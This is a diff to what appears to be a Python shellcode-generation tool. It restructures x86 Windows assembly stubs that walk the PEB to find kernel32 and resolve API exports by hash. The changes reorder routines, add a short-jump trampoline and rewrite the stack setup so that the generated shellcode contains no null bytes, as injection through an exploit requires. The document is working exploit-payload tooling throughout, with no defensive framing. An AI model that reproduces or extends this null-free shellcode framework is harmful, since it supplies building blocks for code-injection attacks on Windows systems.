@@ -28,15 +28,19 @@ from .payload_templates.base import PayloadTemplate, TemplateConfig
 from Tools.strings import emit_push, to_dwords
 
 # ---------------------------------------------------------------------------
-# Framework stubs (extracted verbatim from shellcode-04.py)
-# These are the reusable PEB-walk and export-resolution routines.
+# Framework stubs — PEB-walk and export-resolution routines.
+#
+# Layout is null-free: callees are placed before callers so that every
+# `call` instruction uses a negative (backward) relative offset whose
+# upper bytes are 0xFF, never 0x00.  The entry point uses a two-hop
+# `jmp short` trampoline (1-byte offset, inherently null-free) to skip
+# past the stubs and reach `main`.
 # ---------------------------------------------------------------------------
 
-FRAMEWORK_STUBS = """\
-find_module:
-    call get_first_ldr_entry
-    jmp find_kernel32_entry
-
+# Part 1: placed between `_start: jmp short _stub_trampoline` and the
+# trampoline label.  Estimated ~115 bytes — well within the 127-byte
+# reach of a short jump from `_start`.
+FRAMEWORK_STUBS_PART1 = """\
 get_first_ldr_entry:
     xor ecx, ecx
     mov eax, fs:[ecx + 0x30]
@@ -59,6 +63,10 @@ find_kernel32_entry:
 next:
     mov eax, [eax + 0x10]
     sub eax, 0x10
+    jmp find_kernel32_entry
+
+find_module:
+    call get_first_ldr_entry
     jmp find_kernel32_entry
 
 get_export_directory:
@@ -85,25 +93,11 @@ save_export_context:
     mov [ebp-0x10], esi
     mov [ebp-0x14], ecx
     ret
+"""
 
-resolve_export_by_hash:
-    mov [ebp-0x18], eax
-    xor ecx, ecx
-
-find_export_loop:
-    mov edi, [ebp - 0x08]
-    mov eax, [edi + ecx*4]
-    add eax, [ebp - 0x04]
-    mov esi, eax
-    call compute_hash
-    cmp edx, [ebp-0x18]
-    je resolve_matched_export
-
-inc_next:
-    inc ecx
-    cmp ecx, [ebp - 0x14]
-    jl find_export_loop
-
+# Part 2: placed after `_stub_trampoline: jmp short main`.
+# Estimated ~65 bytes — within short-jump reach of `main`.
+FRAMEWORK_STUBS_PART2 = """\
 compute_hash:
     xor eax, eax
     xor edx, edx
@@ -128,6 +122,24 @@ resolve_matched_export:
     mov eax, [esi + eax*4]
     add eax, [ebp - 0x04]
     ret
+
+resolve_export_by_hash:
+    mov [ebp-0x18], eax
+    xor ecx, ecx
+
+find_export_loop:
+    mov edi, [ebp - 0x08]
+    mov eax, [edi + ecx*4]
+    add eax, [ebp - 0x04]
+    mov esi, eax
+    call compute_hash
+    cmp edx, [ebp-0x18]
+    je resolve_matched_export
+
+inc_next:
+    inc ecx
+    cmp ecx, [ebp - 0x14]
+    jl find_export_loop
 """
 
 
@@ -626,16 +638,22 @@ def compose_asm(
         f"; Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}",
         "",
         "    _start:",
-        "        jmp main",
+        "        jmp short _stub_trampoline",
         "",
         "; ── Framework Stubs ────────────────────────────────────────────────",
         "",
-        FRAMEWORK_STUBS,
+        FRAMEWORK_STUBS_PART1,
+        "_stub_trampoline:",
+        "    jmp short main",
+        "",
+        FRAMEWORK_STUBS_PART2,
         "; ── Main ───────────────────────────────────────────────────────────",
         "",
         "main:",
         "    mov  ebp, esp",
-        "    add  esp, 0xfffffb00",
+        "    xor  ecx, ecx",
+        "    mov  ch, 0x05",
+        "    sub  esp, ecx",
         "",
         "    ; Bootstrap: find kernel32 via PEB walk",
         "    call find_module",
